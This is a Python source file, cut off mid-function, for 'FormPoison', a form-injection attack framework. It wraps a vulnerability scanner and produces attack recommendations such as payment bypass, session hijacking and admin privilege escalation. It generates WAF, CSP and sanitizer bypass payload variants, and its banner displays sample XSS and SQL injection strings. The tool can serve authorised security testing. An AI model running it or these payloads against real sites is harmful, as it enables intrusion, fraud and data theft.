import aiohttp
import asyncio
import json
import itertools
from rich.console import Console
from rich.table import Table
import argparse
import sys
import random
from bs4 import BeautifulSoup
import re
import time
from threading import Thread, Event
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import ssl
import signal
import subprocess
import os
import tempfile
from pathlib import Path
import html
from functions import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Ctrl+C
def handle_sigint(signum, frame):
    console.print("[bold red]Received Ctrl+C. Shutting down gracefully...[/bold red]")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)

######################### GO SCANNER INTEGRATION ###################
class GoScannerIntegration:
    def __init__(self):
        self.scanner_path = self.find_go_scanner()
        self.console = Console()
        
        self.vuln_to_payload_mapping = {
            # SQL Injection patterns
            'sql_injection': ['SQL'],
            'length_validator': ['SQL', 'Java'],
            'size_validator': ['SQL', 'Java'],
            'array_index_check': ['SQL', 'Java'],
            
            # XSS patterns  
            'xss': ['HTML', 'XSS'],
            'equals_type_check': ['HTML', 'Java'],
            'type_casting': ['HTML', 'Java'],
            
            # Command Injection
            'command_injection': ['Java', 'Command'],
            'file_handling': ['Java', 'Path'],
            'network_io': ['Java'],
            
            # Deserialization
            'insecure_deserialization': ['Java', 'Serialization'],
            'reflection': ['Java'],
            'serialization': ['Java'],
            
            # Other Java-specific
            'instanceof_check': ['Java'],
            'null_check': ['Java'],
            'boundary_check': ['Java'],
            'regex_validation': ['Java'],
            'unchecked_exception': ['Java'],
            'string_concatenation': ['Java', 'SQL'],
            'date_handling': ['Java'],
            'enum_usage': ['Java'],
            'annotation_usage': ['Java'],
            'lambda_expression': ['Java'],
            'stream_usage': ['Java'],
            'optional_usage': ['Java'],
            'concurrency': ['Java'],
            'resource_management': ['Java'],
            
            # Additional patterns
            'type_confusion': ['Java'],
            'race_condition': ['Java'],
            'insecure_randomness': ['Java'],
            'path_traversal': ['Path', 'Java']
        }

    def find_go_scanner(self):
        possible_paths = [
            './scanner',
            './vulnerability-scanner',
            '/usr/local/bin/scanner',
            '/usr/bin/scanner',
            'scanner.exe'
        ]

        for path in possible_paths:
            if os.path.exists(path):
                return path

        # check path
        try:
            result = subprocess.run(['which', 'scanner'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass

        return None

    def run_go_scanner(self, url, max_urls=100, max_depth=3, workers=10, proxy_url=None):
        if not self.scanner_path:
            self.console.print("[bold red]Go scanner not found![/bold red]")
            self.console.print("Please compile the Go scanner first:")
            self.console.print("1. go mod init vulnerability-scanner")
            self.console.print("2. go mod tidy") 
            self.console.print("3. go build -o scanner")
            return None

        try:
            cmd = [
                self.scanner_path,
                url,
                str(max_urls),
                str(max_depth),
                str(workers)
            ]
            
            if proxy_url:
                cmd.append(f"--proxy={proxy_url}")

            self.console.print(f"[bold green]Running Go scanner: {' '.join(cmd)}[/bold green]")
            self.console.print("[yellow]Don't worry about scan time! It works just fine, but be patient during scan...[/yellow]")
            self.console.print("")

            # Animation setup
            stop_animation = Event()
            animation_thread = None

            def animation():
                spinner = itertools.cycle(['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'])
                dots = itertools.cycle(['.', '..', '...', '....'])
                stages = [
                    "🔍 Crawling websites",
                    "📝 Analyzing source code", 
                    "🛡️ Checking security patterns",
                    "📊 Generating report"
                ]

                stage_index = 0
                start_time = time.time()

                while not stop_animation.is_set():
                    elapsed = int(time.time() - start_time)
                    minutes, seconds = divmod(elapsed, 60)
                    time_str = f"{minutes:02d}:{seconds:02d}"

                    current_stage = stages[stage_index]
                    spinner_char = next(spinner)
                    dots_char = next(dots)

                    self.console.print(
                        f"[cyan]{spinner_char}[/cyan] [bold]{current_stage}[/bold]"
                        f"[yellow]{dots_char}[/yellow] [dim](Time: {time_str})[/dim]",
                        end="\r"
                    )

                    # Change stage every 8 seconds
                    if elapsed % 8 == 0 and elapsed > 0:
                        stage_index = (stage_index + 1) % len(stages)

                    time.sleep(0.2)

            # Start the animation
            animation_thread = Thread(target=animation)
            animation_thread.daemon = True
            animation_thread.start()

            # Run the scanner
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)

            # Stop animation
            stop_animation.set()
            if animation_thread:
                animation_thread.join(timeout=1.0)

            # Clear the animation line
            self.console.print(" " * 100, end="\r")

            if result.returncode == 0:
                output_lines = result.stdout.strip().split('\n')
                if output_lines:
                    # Display the Go scanner output
                    for line in output_lines:
                        self.console.print(f"[bold cyan]{line}[/bold cyan]")

                    report_file = output_lines[-1].strip()
                    if report_file and os.path.exists(report_file):
                        self.console.print("[green]✓ Scan completed successfully![/green]")
                        return report_file
                    else:
                        self.console.print(f"[bold red]Report file not found: {report_file}[/bold red]")
            else:
                self.console.print(f"[bold red]Scanner error: {result.stderr}[/bold red]")

        except subprocess.TimeoutExpired:
            stop_animation.set()
            self.console.print(" " * 100, end="\r")
            self.console.print("[bold red]Scanner timeout after 1h![/bold red]")
        except Exception as e:
            stop_animation.set()
            self.console.print(" " * 100, end="\r")
            self.console.print(f"[bold red]Scanner execution error: {e}[/bold red]")
        finally:
            stop_animation.set()

        return None

    def parse_scan_report(self, report_file):
        if not report_file:
            self.console.print("[bold red]No report file provided![/bold red]")
            return None

        try:
            with open(report_file, 'r', encoding='utf-8') as f:
                report = json.load(f)
            return report
        except FileNotFoundError:
            self.console.print(f"[bold red]Report file not found: {report_file}[/bold red]")
            return None
        except json.JSONDecodeError:
            self.console.print(f"[bold red]Invalid JSON format in report file: {report_file}[/bold red]")
            return None
        except Exception as e:
            self.console.print(f"[bold red]Error parsing scan report: {e}[/bold red]")
            return None

    def generate_attack_recommendations(self, scan_report):
        recommendations = []

        if not scan_report or 'vulnerabilities' not in scan_report:
            return recommendations

        vuln_types = set()
        for vuln in scan_report['vulnerabilities']:
            vuln_types.add(vuln['pattern'])

        # map for possible vulns based on scanner output
        attack_mapping = {
            # Java patterns
            'length_validator': [
                "Type Confusion Attack - Send malformed objects with custom length property",
                "Array manipulation - Bypass length validation",
                "Buffer overflow - Exceed length limits with large inputs"
            ],
            'size_validator': [
                "Collection manipulation - Bypass size checks",
                "Object prototype pollution - Manipulate size properties",
                "Heap exhaustion - Large size values causing OOM"
            ],
            'array_index_check': [
                "Array index manipulation - Out of bounds access",
                "Type confusion in array access",
                "Integer overflow in index calculation"
            ],
            'instanceof_check': [
                "Type confusion - Fake object types",
                "Prototype pollution to bypass instanceof",
                "Serialization attack with manipulated types"
            ],
            'type_casting': [
                "Type casting bypass - Malformed type casting",
                "Object manipulation during casting",
                "Class cast exception exploitation"
            ],
            'equals_type_check': [
                "Type spoofing - Manipulate getClass() results",
                "Classloader attacks - Fake class equality"
            ],
            'null_check': [
                "Null pointer dereference - Bypass null checks",
                "Race condition in null validation"
            ],
            'boundary_check': [
                "Boundary bypass - Off-by-one errors",
                "Integer overflow/underflow attacks"
            ],
            'regex_validation': [
                "Regex bypass - Complex input breaking patterns",
                "ReDoS attacks - Exponential regex matching"
            ],
            'unchecked_exception': [
                "Exception handling bypass - Uncaught exceptions",
                "Error-based information disclosure"
            ],
            'reflection': [
                "Reflection attacks - Unauthorized method invocation",
                "Access control bypass via reflection",
                "Private method/field access"
            ],
            'serialization': [
                "Insecure deserialization - Malicious objects",
                "Serialization DoS - Large object graphs"
            ],
            'file_handling': [
                "Path traversal - Directory attacks",
                "File race conditions - TOCTOU",
                "Symlink attacks"
            ],
            'network_io': [
                "SSRF attacks - Server-side request forgery",
                "DNS rebinding",
                "Port scanning via application"
            ],
            'string_concatenation': [
                "String injection - Code/sql injection via concatenation",
                "Memory exhaustion - Large string operations"
            ],
            'date_handling': [
                "Time manipulation - Bypass time-based checks",
                "Date parsing vulnerabilities"
            ],
            'enum_usage': [
                "Enum bypass - Direct value manipulation",
                "Enum injection via reflection"
            ],
            'annotation_usage': [
                "Annotation spoofing - Fake security annotations",
                "Runtime annotation manipulation"
            ],
            'lambda_expression': [
                "Lambda injection - Malicious lambda execution",
                "Method handle manipulation"
            ],
            'stream_usage': [
                "Stream manipulation - Malicious stream operations",
                "Parallel stream race conditions"
            ],
            'optional_usage': [
                "Optional bypass - Direct value extraction",
                "Null pointer via empty optional"
            ],
            'concurrency': [
                "Race conditions - TOCTOU attacks",
                "Deadlock attacks",
                "Atomic variable manipulation"
            ],
            'resource_management': [
                "Resource exhaustion - File descriptor leaks",
                "Resource race conditions"
            ],

            # OWASP patterns
            'sql_injection': [
                "SQL Injection - Standard SQLi payloads",
                "Blind SQL Injection",
                "Time-based SQL Injection",
                "Union-based SQL Injection",
                "Boolean-based SQL Injection"
            ],
            'xss': [
                "XSS - Standard XSS payloads",
                "DOM-based XSS",
                "Stored XSS",
                "Reflected XSS",
                "mXSS - Mutation XSS"
            ],
            'path_traversal': [
                "Path Traversal - Directory traversal",
                "Local file inclusion",
                "Sensitive file reading",
                "Zip slip attacks"
            ],
            'command_injection': [
                "Command Injection - OS command execution",
                "Remote code execution",
                "Argument injection",
                "Shellshock-like attacks"
            ],
            'insecure_deserialization': [
                "Insecure Deserialization - Malicious object deserialization",
                "Remote code execution via deserialization",
                "JSON/XML deserialization attacks",
                "Deserialization DoS"
            ],

            'type_confusion': [
                "Type confusion attacks - Fake type information",
                "Memory corruption via type confusion"
            ],
            'race_condition': [
                "Race Condition - TOCTOU attacks",
                "Concurrency issues exploitation",
                "Time-based attacks"
            ],
            'insecure_randomness': [
                "Cryptographic attack - Predict random values",
                "Session hijacking via predictable tokens",
                "CSRF token prediction",
                "Password reset token prediction"
            ]
        }

        # context matching:
        if 'context_matches' in scan_report:
            context_matches = scan_report['context_matches']

            if any(ctx in context_matches for ctx in ['financial_vars', 'financial_context']):
                recommendations.extend([
                    "Manipulate transaction amounts",
                    "Account Balance manipulation attacks (overflow)",
                    "Payment bypass attempts",
                    "try negative amount",
                ])

            if any(ctx in context_matches for ctx in ['authentication_context', 'session_vars']):
                recommendations.extend([
                    "🔐 Session hijacking attempts",
                    "🔐 Authentication bypass testing",
                    "🔐 Privilege escalation via auth flaws",
                    "🔐 JWT token manipulation",
                    "🔐 OAuth flow bypass"
                ])

            if 'personal_data_vars' in context_matches:
                recommendations.extend([
                    "PII data extraction attacks",
                    "Privacy violation testing",
                    "Data exposure attempts",
                    "GDPR compliance testing"
                ])

            if 'admin_context' in context_matches:
                recommendations.extend([
                    "⚡ Admin functionality bypass",
                    "⚡ Privilege escalation to admin",
                    "⚡ Backdoor access attempts"
                ])

        for vuln_type in vuln_types:
            if vuln_type in attack_mapping:
                recommendations.extend(attack_mapping[vuln_type])
            else:
                # default recommendations
                recommendations.append(f"Generic exploitation for {vuln_type} vulnerability")
                recommendations.append(f"Fuzz testing for {vuln_type} implementation")

        return list(set(recommendations))

    def scan_and_analyze(self, url, max_urls=100, max_depth=3, workers=10, proxy_url=None):
        # full analysis with GO scanner
        self.console.print(f"[bold blue]Starting Go scanner for: {url}[/bold blue]")
        if proxy_url:
            self.console.print(f"[bold yellow]Using proxy.[/bold yellow]")
        # run scan
        report_file = self.run_go_scanner(url, max_urls, max_depth, workers, proxy_url)

        if not report_file:
            self.console.print("[bold red]Scan failed! No report file generated.[/bold red]")
            return [], []

        # parsing raport
        scan_report = self.parse_scan_report(report_file)

        if not scan_report:
            self.console.print("[bold yellow]Failed to parse scan report[/bold yellow]")
            return [], []

        self.console.print(f"[bold green]Scan completed![/bold green]")
        self.console.print(f"URLs scanned: {scan_report.get('scanned_urls', 0)}")
        self.console.print(f"Vulnerabilities found: {len(scan_report.get('vulnerabilities', []))}")

        recommendations = self.generate_attack_recommendations(scan_report)

        if recommendations:
            self.console.print("[bold green]Attack recommendations:[/bold green]")
            for recommendation in recommendations:
                self.console.print(f"[yellow]- {recommendation}[/yellow]")
        else:
            self.console.print("[bold yellow]No specific attack recommendations from Go scanner.[/bold yellow]")

        return scan_report, recommendations

    def map_vulnerabilities_to_payloads(self, scan_report, all_payloads):
        targeted_payloads = []
        vulnerability_categories = set()
        
        if not scan_report or 'vulnerabilities' not in scan_report:
            return all_payloads, vulnerability_categories

        # get all vulns 
        for vuln in scan_report['vulnerabilities']:
            vuln_type = vuln['pattern']
            vulnerability_categories.add(vuln_type)
            
            # map vuln type to payload category
            if vuln_type in self.vuln_to_payload_mapping:
                payload_categories = self.vuln_to_payload_mapping[vuln_type]
                
                for payload in all_payloads:
                    if payload['category'] in payload_categories:
                        enhanced_payload = payload.copy()
                        enhanced_payload['targeted_vulnerability'] = vuln_type
                        enhanced_payload['confidence'] = self.calculate_confidence(vuln, payload)
                        targeted_payloads.append(enhanced_payload)

        if not targeted_payloads:
            self.console.print("[yellow]No specific payload mapping found, using all payloads[/yellow]")
            return all_payloads, vulnerability_categories
        
        # remove duplicates 
        unique_payloads = {}
        for payload in targeted_payloads:
            key = payload['inputField']
            if key not in unique_payloads or payload.get('confidence', 0) > unique_payloads[key].get('confidence', 0):
                unique_payloads[key] = payload
        
        return list(unique_payloads.values()), vulnerability_categories

    def calculate_confidence(self, vulnerability, payload):
        confidence = 0.5 
        
        # increase confidence if 1:1 found. 
        vuln_type = vulnerability['pattern']
        payload_category = payload['category']
        
        if vuln_type == 'sql_injection' and payload_category == 'SQL':
            confidence += 0.3
        elif vuln_type == 'xss' and payload_category in ['HTML', 'XSS']:
            confidence += 0.3
        elif 'injection' in vuln_type and 'injection' in payload_category.lower():
            confidence += 0.2
            
        # severity
        severity = vulnerability.get('severity', 'MEDIUM')
        if severity == 'HIGH':
            confidence += 0.1
        elif severity == 'CRITICAL':
            confidence += 0.2
            
        return min(confidence, 1.0)

    def generate_context_aware_payloads(self, scan_report, base_payloads, bypass_flags=None):
        targeted_payloads, vuln_categories = self.map_vulnerabilities_to_payloads(scan_report, base_payloads)
        
        # applying bypass techniques based on scan results
        enhanced_payloads = self.apply_bypass_techniques(targeted_payloads, scan_report, bypass_flags)
        
        self.console.print(f"[green]🎯 Targeted payload generation:[/green]")
        self.console.print(f"[blue]Vulnerabilities detected: {len(vuln_categories)}[/blue]")
        self.console.print(f"[blue]Targeted payloads: {len(enhanced_payloads)}[/blue]")
        
        for vuln in vuln_categories:
            matching_payloads = [p for p in enhanced_payloads if p.get('targeted_vulnerability') == vuln]
            if matching_payloads:
                self.console.print(f"[yellow]  {vuln}: {len(matching_payloads)} payloads[/yellow]")
        
        return enhanced_payloads

    def apply_bypass_techniques(self, payloads, scan_report, bypass_flags):
        enhanced_payloads = []
        
        for payload in payloads:
            enhanced_payloads.append(payload)
            
            vuln_type = payload.get('targeted_vulnerability', '')
            
            if bypass_flags.get('waf_bypass') and any(inj in vuln_type.lower() for inj in ['injection', 'xss', 'sql']):
                bypassed = waf_bypass.generate_bypassed_payloads(payload['inputField'], 2)
                for bp in bypassed:
                    enhanced_payload = payload.copy()
                    enhanced_payload['inputField'] = bp
                    enhanced_payload['category'] = payload['category'] + '_WAF_BYPASS'
                    enhanced_payload['bypass_technique'] = 'WAF'
                    enhanced_payloads.append(enhanced_payload)

            if bypass_flags.get('csp_bypass') and payload['category'] in ['HTML', 'XSS']:
                bypassed = csp_bypass.generate_csp_bypass_payloads(payload['inputField'], 2)
                for bp in bypassed:
                    enhanced_payload = payload.copy()
                    enhanced_payload['inputField'] = bp
                    enhanced_payload['category'] = payload['category'] + '_CSP_BYPASS'
                    enhanced_payload['bypass_technique'] = 'CSP'
                    enhanced_payloads.append(enhanced_payload)

            if bypass_flags.get('sanitizer_bypass'):
                bypassed = sanitizer_bypass.generate_sanitizer_bypass_payloads(payload['inputField'], 2)
                for bp in bypassed:
                    enhanced_payload = payload.copy()
                    enhanced_payload['inputField'] = bp
                    enhanced_payload['category'] = payload['category'] + '_SANITIZER_BYPASS'
                    enhanced_payload['bypass_technique'] = 'SANITIZER'
                    enhanced_payloads.append(enhanced_payload)

        return enhanced_payloads
#########################DETECTIONS###################
def detect_framework(headers, content):
    framework_detected = None
    version = None
    content_lower = content.lower() if content else ""

    framework_indicators = {
        # Express.js
        'Express.js': {
            'headers': [
                ('x-powered-by', r'express(?:\.js)?/?(\d+\.\d+\.\d+)?'),
                ('server', r'express(?:\.js)?/?(\d+\.\d+\.\d+)?')
            ],
            'cookies': ['connect.sid'],
            'content_patterns': [r'app\.use\(.*express\)']
        },

        # Laravel
        'Laravel': {
            'headers': [
                ('x-powered-by', r'laravel/?(\d+\.\d+\.\d+)?'),
            ],
            'cookies': ['laravel_session', 'XSRF-TOKEN'],
            'content_patterns': [r'<meta name="csrf-token" content="[^"]+"']
        },

        # Django
        'Django': {
            'headers': [
                ('x-powered-by', r'django/?(\d+\.\d+\.\d+)?'),
                ('server', r'django/?(\d+\.\d+\.\d+)?')
            ],
            'cookies': ['csrftoken', 'sessionid'],
            'content_patterns': [r'csrfmiddlewaretoken']
        },

        # Flask
        'Flask': {
            'headers': [
                ('server', r'werkzeug/?(\d+\.\d+\.\d+)?'),
            ],
            'cookies': ['session']
        },

        # ASP.NET
        'ASP.NET': {
            'headers': [
                ('x-powered-by', r'asp\.net/?(\d+\.\d+\.\d+)?'),
                ('x-aspnet-version', r'(\d+\.\d+\.\d+)'),
            ],
            'content_patterns': [r'__VIEWSTATE', r'__EVENTVALIDATION']
        },

        # React
        'React': {
            'content_patterns': [
                r'<div id="root"></div>',
                r'__NEXT_DATA__',
                r'react\.js'
            ]
        },

        # Angular
        'Angular': {
            'content_patterns': [
                r'<app-root></app-root>',
                r'angular\.js',
                r'zone\.js'
            ]
        },

        # Vue.js
        'Vue.js': {
            'content_patterns': [
                r'<div id="app"></div>',
                r'vue\.js',
                r'__vue__'
            ]
        }
    }

    # hd
    for framework, indicators in framework_indicators.items():
        for header_name, pattern in indicators.get('headers', []):
            if header_name in headers:
                header_value = headers[header_name].lower()
                match = re.search(pattern, header_value, re.IGNORECASE)
                if match:
                    framework_detected = framework
                    version = match.group(1) if match.groups() else None
                    return framework_detected, version  # Zwracamy od razu - wysokie zaufanie

    # ck
    for framework, indicators in framework_indicators.items():
        if 'cookies' in indicators:
            cookie_header = headers.get('set-cookie', '').lower()
            for cookie_name in indicators['cookies']:
                if cookie_name.lower() in cookie_header:
                    framework_detected = framework
                    return framework_detected, version

    framework_candidates = {}
    for framework, indicators in framework_indicators.items():
        for pattern in indicators.get('content_patterns', []):
            if re.search(pattern, content_lower):
                # try to get version
                version_match = re.search(pattern.replace(r'(\d+\.\d+\.\d+)', r'(\d+\.\d+\.\d+)'), content)
                version_found = version_match.group(1) if version_match and version_match.groups() else None

                if framework not in framework_candidates:
                    framework_candidates[framework] = {
                        'count': 0,
                        'version': version_found
                    }
                framework_candidates[framework]['count'] += 1

    # summarize and return framework
    if framework_candidates:
        best_framework = max(framework_candidates.items(), key=lambda x: x[1]['count'])
        framework_detected = best_framework[0]
        version = best_framework[1]['version']

    return framework_detected, version

def detect_cms(content):
    cms_detected = None
    version = None

    content_lower = content.lower()

    # WordPress
    if '/wp-content/' in content_lower or '/wp-admin/' in content_lower:
        cms_detected = 'WordPress'
        if '<!-- wordpress version' in content_lower:
            version = content_lower.split('<!-- wordpress version ')[1].split('-->')[0].strip()

    # Joomla
    elif '/media/jui/' in content_lower or '/administrator/' in content_lower:
        cms_detected = 'Joomla'
        if '<!-- joomla version' in content_lower:
            version = content_lower.split('<!-- joomla version ')[1].split('-->')[0].strip()

    # Drupal
    elif '/sites/default/' in content_lower or '/core/assets/' in content_lower:
        cms_detected = 'Drupal'
        if '<!-- drupal version' in content_lower:
            version = content_lower.split('<!-- drupal version ')[1].split('-->')[0].strip()

    # Magento
    elif '/skin/frontend/' in content_lower or '/media/css/' in content_lower:
        cms_detected = 'Magento'
        if '<!-- magento version' in content_lower:
            version = content_lower.split('<!-- magento version ')[1].split('-->')[0].strip()

    # Shopify
    elif 'shopify' in content_lower or 'cdn.shopify.com' in content_lower:
        cms_detected = 'Shopify'
        if '<!-- shopify version' in content_lower:
            version = content_lower.split('<!-- shopify version ')[1].split('-->')[0].strip()

    return cms_detected, version

def detect_libraries(content):
    libraries_detected = []

    content_lower = content.lower()

    # Bootstrap
    if 'bootstrap.min.css' in content_lower or 'bootstrap.min.js' in content_lower:
        version = None
        if 'bootstrap.min.css' in content_lower:
            # Poprawione extractowanie wersji
            version_match = re.search(r'bootstrap(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Bootstrap', version))
    elif 'container' in content_lower and 'row' in content_lower and 'col-md-' in content_lower:
        libraries_detected.append(('Bootstrap', None))

    # Tailwind CSS
    if 'tailwind.min.css' in content_lower or 'bg-blue-' in content_lower or 'text-center' in content_lower:
        version = None
        if 'tailwind.min.css' in content_lower:
            version_match = re.search(r'tailwind(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Tailwind CSS', version))

    # jQuery
    if 'jquery.min.js' in content_lower or 'jquery.js' in content_lower or 'jquery(' in content_lower:
        version = None
        if 'jquery.min.js' in content_lower:
            version_match = re.search(r'jquery(?:\.min)?\.js\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('jQuery', version))

    # Lodash
    if 'lodash.min.js' in content_lower or '_.' in content_lower:
        version = None
        if 'lodash.min.js' in content_lower:
            version_match = re.search(r'lodash(?:\.min)?\.js\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Lodash', version))

    # Materialize
    if 'materialize.min.css' in content_lower or 'materialize.min.js' in content_lower:
        version = None
        if 'materialize.min.css' in content_lower:
            version_match = re.search(r'materialize(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Materialize', version))

    # Foundation
    if 'foundation.min.css' in content_lower or 'foundation.min.js' in content_lower:
        version = None
        if 'foundation.min.css' in content_lower:
            version_match = re.search(r'foundation(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Foundation', version))

    # Bulma
    if 'bulma.min.css' in content_lower or 'bulma.css' in content_lower:
        version = None
        if 'bulma.min.css' in content_lower:
            version_match = re.search(r'bulma(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Bulma', version))

    # Semantic UI
    if 'semantic.min.css' in content_lower or 'semantic.min.js' in content_lower:
        version = None
        if 'semantic.min.css' in content_lower:
            version_match = re.search(r'semantic(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Semantic UI', version))

    # Moment.js
    if 'moment.min.js' in content_lower or 'moment.js' in content_lower:
        version = None
        if 'moment.min.js' in content_lower:
            version_match = re.search(r'moment(?:\.min)?\.js\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Moment.js', version))

    # Chart.js
    if 'chart.min.js' in content_lower or 'chart.js' in content_lower:
        version = None
        if 'chart.min.js' in content_lower:
            version_match = re.search(r'chart(?:\.min)?\.js\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Chart.js', version))

    return libraries_detected

def detect_server_technology(headers):
    server_tech = None
    version = None

    if 'Server' in headers:
        server = headers['Server'].lower()
        if 'apache' in server:
            server_tech = 'Apache'
            version = server.split('apache/')[-1].split()[0] if 'apache/' in server else None
        elif 'nginx' in server:
            server_tech = 'Nginx'
            version = server.split('nginx/')[-1].split()[0] if 'nginx/' in server else None
        elif 'iis' in server:
            server_tech = 'IIS'
            version = server.split('iis/')[-1].split()[0] if 'iis/' in server else None

    return server_tech, version

def detect_cdn(headers):
    cdn_detected = None
    version = None

    if 'Server' in headers:
        server = headers['Server'].lower()
        if 'cloudflare' in server:
            cdn_detected = 'Cloudflare'
            version = server.split('cloudflare/')[-1].split()[0] if 'cloudflare/' in server else None
        elif 'akamai' in server:
            cdn_detected = 'Akamai'
            version = server.split('akamai/')[-1].split()[0] if 'akamai/' in server else None
        elif 'aws' in server:
            cdn_detected = 'AWS CloudFront'
            version = server.split('aws/')[-1].split()[0] if 'aws/' in server else None

    return cdn_detected, version

def detect_ssl(url):
    import ssl
    import socket
    from datetime import datetime

    try:
        hostname = url.split('//')[1].split('/')[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()

        # valid until
        expire_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        issuer = dict(x[0] for x in cert['issuer'])['organizationName']

        return f"Valid until {expire_date}, Issuer: {issuer}"
    except Exception as e:
        return f"SSL/TLS Error: {e}"
###############################################################


console = Console()
go_scanner = GoScannerIntegration()  #go scanner init


##################SCANNING MODE##############################
async def scan_website(url, headers, content):
    results = []

    # detect framework
    framework_detected, framework_version = detect_framework(headers, content)
    if framework_detected:
        if framework_version:
            results.append(("Framework", f"{framework_detected} (v{framework_version})"))
        else:
            results.append(("Framework", framework_detected))

    # detect CSS/JS libraries
    libraries_detected = detect_libraries(content)
    if libraries_detected:
        libraries_info = []
        for lib, version in libraries_detected:
            if version:
                libraries_info.append(f"{lib} (v{version})")
            else:
                libraries_info.append(lib)
        results.append(("Libraries", ", ".join(libraries_info)))

    # detect CMS
    cms_detected, cms_version = detect_cms(content)
    if cms_detected:
        if cms_version:
            results.append(("CMS", f"{cms_detected} (v{cms_version})"))
        else:
            results.append(("CMS", cms_detected))

    # detect server technology
    server_tech, server_version = detect_server_technology(headers)
    if server_tech:
        if server_version:
            results.append(("Server Technology", f"{server_tech} (v{server_version})"))
        else:
            results.append(("Server Technology", server_tech))

    # detect CDN
    cdn_detected, cdn_version = detect_cdn(headers)
    if cdn_detected:
        if cdn_version:
            results.append(("CDN", f"{cdn_detected} (v{cdn_version})"))
        else:
            results.append(("CDN", cdn_detected))

    # SSL/TLS
    ssl_info = detect_ssl(url)
    if ssl_info:
        results.append(("SSL/TLS", ssl_info))

    return results

async def scan(url, proxies=None):
    headers = {'User-Agent': 'FormPoison 1.0.'}
    try:
        ssl_context = ssl.create_default_context()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.get(url, headers=headers) as response:
                content = await response.text()
                headers = response.headers
                results = await scan_website(url, headers, content)

                # table w results
                table = Table(title="Scan Results")
                table.add_column("Category", style="cyan")
                table.add_column("Value", style="magenta")

                for category, value in results:
                    table.add_row(category, value)

                console.print(table)
    except Exception as e:
        console.print(f"[bold red]Error scanning {url}: {e}[/bold red]")
#######################################################################

def sanitize_user_agent(user_agent):
    return re.sub(r'[^\x00-\x7F]+', '', user_agent)

def show_banner():
    banner = r"""
  [bold blue]Form[/bold blue]                                 .--.
      [bold red]Poison[/bold red]                  ,-.------+-.|  ,-.
                  ,--=======* )"("")===)===* )
                              `-"---==-+-"|  `-"
                                       '--'
    """
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

    staticbanner = f"""
  {BLUE}Form{RESET}                                 .--.
      {RED}Poison{RESET}                  ,-.------+-.|  ,-.
                  ,--=======* )"("")===)===* )
                              `-"---==-+-"|  `-"
                                       '--'
              Input fields and forms injection framework.
              Developed by: https://github.com/csshark
                                                v. 1.0.1.
    """

    def animate_falling_texts(texts, banner, start_line=0, end_line=3):
        banner_lines = banner.split('\n')
        max_lines = len(banner_lines) + end_line
        for text in texts:
            for i in range(start_line, max_lines):
                console.clear()
                console.print(banner)
                console.print('\n' * i + "\t" + text)
                time.sleep(0.01)

    falling_words = [
        "<script>",
        "alert(1)",
        "' OR 1=1;",
        "<audio src=x onerror=alert('XSS')>",
        "<noscript>Sorry, your browser does not support Html</noscript>",
        "<img src=x onerror=alert(1)>",
        "1=1; --",
        "<svg/onload=alert(1)>",
        "'; DROP TABLE users; --",
        "<iframe src=javascript:alert(1)>",
        "H4CK3D",
        "403 HTTP",
        "User-Agent: Fake Geco",
        "Error: ",
        "POST /api/endpoint 1.1. HTTP",
        "password",
        "MySQL: error.",
        "[ XSS! ]",
        "Response: 200 OK"
    ]

    animate_falling_texts(falling_words, banner)
    print(staticbanner)
    print("Framework Initialization Done.")

def parse_cookies(cookie_str):
    cookies = {}
    if cookie_str:
        for pair in cookie_str.split(';'):
            if '=' in pair:
                key, value = pair.strip().split('=', 1)
                cookies[key] = value
    return cookies

def parse_proxy(proxy_url):
    if not proxy_url:
        return None

    if "@" in proxy_url:
        proxy_parts = proxy_url.split("://")[1].split("@")
        auth_part = proxy_parts[0]
        proxy_domain = proxy_parts[1]
        proxy_url = f"http://{proxy_domain}"
        proxy_auth = auth_part
    else:
        proxy_auth = None

    proxies = {
        "http": proxy_url,
        "https": proxy_url
    }

    if proxy_auth:
        proxies["http"] = f"http://{proxy_auth}@{proxy_domain}"
        proxies["https"] = f"https://{proxy_auth}@{proxy_domain}"

    return proxies

def load_payloads(file_path, bypass_flags=None):
    try:
        with open(file_path, 'r') as f:
            payloads = json.load(f)

        if bypass_flags:
            enhanced_payloads = []
            for payload in payloads:
                enhanced_payloads.append(payload)

                if bypass_flags.get('waf_bypass'):
                    bypassed = waf_bypass.generate_bypassed_payloads(payload['inputField'], 3)
                    for bp in bypassed:
                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_WAF_BYPASS'})

                if bypass_flags.get('csp_bypass') and payload['category'] in ['HTML', 'XSS']:
                    bypassed = csp_bypass.generate_csp_bypass_payloads(payload['inputField'], 2)
                    for bp in bypassed:
                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_CSP_BYPASS'})

                if bypass_flags.get('sanitizer_bypass'):
